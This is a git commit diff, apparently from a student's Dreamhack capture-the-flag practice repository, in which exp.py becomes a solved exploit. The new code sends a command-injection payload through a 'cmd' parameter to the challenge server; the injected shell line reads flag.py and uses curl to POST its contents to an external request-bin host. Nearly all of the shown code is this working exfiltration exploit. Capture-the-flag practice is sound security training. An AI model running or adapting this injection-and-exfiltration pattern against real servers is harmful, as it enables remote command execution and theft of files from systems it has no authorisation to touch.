1415cf5d972e2a7c0deee4cc07ad9066f3d6e2d6
Hueok <124287568+Hueok@users.noreply.github.com>
2023-07-21 13:38:28 +0900

    SOLVED LAST PROB

--- last/exp.py
+++ last/exp.py
@@ -1,11 +1,12 @@
-import requests
+import requests, os
 
-url = 'http://host3.dreamhack.games:23703'
-test_url = 'https://bdqbwly.request.dreamhack.games'
-param={
-    'cmd' : 'test'
-}
+bin_url = 'https://oqwerdj.request.dreamhack.games'
+server_url = 'http://host1.dreamhack.games:13639/'
+shell = f'data=$(cat flag.py);curl --request POST {bin_url} -d "$data"'
 
-resp = requests.get(test_url, params = param).text
 
-print(resp)
+req = f'{server_url}?cmd={shell}'
+
+resp = requests.head(req)
+
+print(resp if resp else 'nothing')
